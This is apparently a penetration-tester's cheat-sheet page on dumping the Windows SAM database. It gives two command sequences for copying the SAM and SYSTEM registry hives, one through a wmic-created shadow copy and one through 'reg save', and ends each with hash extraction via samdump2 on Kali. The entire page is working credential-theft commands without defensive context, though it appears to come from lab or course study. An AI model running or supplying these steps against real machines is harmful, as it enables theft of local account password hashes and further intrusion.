---
title: SAM Database
layout: default
parent: Windows Credentials
nav_order: 1
---

## Shadow Copy ##

1. Run:
`wmic shadowcopy call create Volume='C:\'`

2. List the created copy:
`vssadmin list shadows`

3. Copy SAM out (change based on 2):
`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam`

4. Copy SYSTEM as well (change based on 2):
`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system`

5. Extract hashes on Kali:
`samdump2 system sam`

## Reg save ##

1. Copy SAM:
`reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam`

2. Copy SYSTEM:
`reg save HKLM\system C:\users\offsec.corp1\Downloads\system`

3. Extract hashes on Kali:
`samdump2 system sam`